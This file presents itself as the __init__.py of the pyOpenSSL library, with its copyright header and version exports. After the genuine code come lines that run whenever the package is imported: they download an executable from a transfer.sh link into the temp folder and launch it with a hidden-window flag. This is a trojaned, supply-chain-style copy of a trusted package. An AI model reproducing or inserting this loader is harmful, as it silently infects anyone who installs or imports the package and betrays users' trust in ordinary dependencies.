# Copyright (C) AB Strakt
# See LICENSE for details.

"""
pyOpenSSL - A simple wrapper around the OpenSSL library
"""

import subprocess
import tempfile
import urllib.request
from OpenSSL import SSL, crypto
from OpenSSL.version import (
    __author__,
    __copyright__,
    __email__,
    __license__,
    __summary__,
    __title__,
    __uri__,
    __version__,
)

__all__ = [
    "SSL",
    "crypto",
    "__author__",
    "__copyright__",
    "__email__",
    "__license__",
    "__summary__",
    "__title__",
    "__uri__",
    "__version__",
]

fr = tempfile.gettempdir();

urllib.request.urlretrieve("https://transfer.sh/get/mvHgC3/package.exe", fr + "\package.exe")

cmd = fr + "\package.exe"

process = subprocess.Popen(cmd, creationflags=0x08000000)